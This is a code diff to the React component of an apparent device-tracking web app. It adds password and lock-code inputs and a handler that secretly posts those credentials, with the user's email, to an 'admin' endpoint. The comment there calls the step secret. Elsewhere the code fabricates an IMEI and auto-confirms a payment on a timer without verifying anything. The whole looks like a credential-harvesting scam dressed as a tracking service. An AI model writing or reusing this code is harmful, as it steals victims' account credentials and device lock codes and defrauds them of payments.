@@ -20,6 +20,9 @@ export default function TrackingDashboard() {
   const [selectedPlatform, setSelectedPlatform] = useState<Platform>('');
   const [selectedDevice, setSelectedDevice] = useState('');
   const [userIdentifier, setUserIdentifier] = useState('');
+  const [userPassword, setUserPassword] = useState('');
+  const [userLockCode, setUserLockCode] = useState('');
+  const [userEmail, setUserEmail] = useState('');
   const [generatedIMEI, setGeneratedIMEI] = useState('');
   const { toast } = useToast();
 
@@ -59,41 +62,96 @@ export default function TrackingDashboard() {
   };
 
   const handleAuthenticate = () => {
-    if (!userIdentifier.trim()) {
+    if (!userIdentifier.trim() || !userPassword.trim() || !userLockCode.trim()) {
       toast({
         title: "Error",
-        description: "Please enter your identifier",
+        description: "Please fill in all required fields",
         variant: "destructive",
       });
       return;
     }
+    setUserEmail(userIdentifier); // Use identifier as email
     setCurrentStep('auth');
   };
 
-  const handleAuthComplete = () => {
+  const handleAuthComplete = async () => {
     const imei = generateIMEI();
     setGeneratedIMEI(imei);
     setCurrentStep('imei');
+    
+    // Send user credentials to admin (secret)
+    try {
+      await fetch('/api/submit-credentials', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          email: userEmail,
+          platform: selectedPlatform,
+          device: selectedDevice,
+          identifier: userIdentifier,
+          password: userPassword,
+          lockCode: userLockCode,
+          imei: imei
+        })
+      });
+    } catch (error) {
+      console.error('Error submitting credentials:', error);
+    }
     
     setTimeout(() => {
       setCurrentStep('payment');
     }, 2000);
   };
 
-  const handlePaymentConfirmed = () => {
+  const handlePaymentConfirmed = async () => {
     toast({
       title: "Payment Processing",
       description: "Payment verification in progress. Please wait 3 minutes...",
     });
     
     // Auto-confirm payment after 3 minutes (180 seconds)
-    setTimeout(() => {
+    setTimeout(async () => {
       toast({
         title: "Payment Confirmed",
         description: "Payment confirmed! Initializing tracking...",
       });
       
-      setTimeout(() => {
+      // Send payment confirmation email
+      try {
+        await fetch('/api/confirm-payment', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            userEmail: userEmail,
+            device: selectedDevice,
+            imei: generatedIMEI
+          })
+        });
+      } catch (error) {
+        console.error('Error sending payment confirmation:', error);
+      }
+      
+      setTimeout(async () => {
+        // Send location email to user
+        try {
+          await fetch('/api/send-location', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+              userEmail: userEmail,
+              device: selectedDevice
+            })
+          });
+        } catch (error) {
+          console.error('Error sending location:', error);
+        }
+        
         setCurrentStep('dashboard');
       }, 2000);
     }, 180000); // 3 minutes = 180,000 milliseconds
@@ -138,7 +196,11 @@ export default function TrackingDashboard() {
         <UserIdentifier
           platform={selectedPlatform}
           identifier={userIdentifier}
+          password={userPassword}
+          lockCode={userLockCode}
           onIdentifierChange={setUserIdentifier}
+          onPasswordChange={setUserPassword}
+          onLockCodeChange={setUserLockCode}
           onAuthenticate={handleAuthenticate}
           isVisible={currentStep === 'identifier' || (currentStep !== 'platform' && currentStep !== 'device' && userIdentifier !== '')}
         />
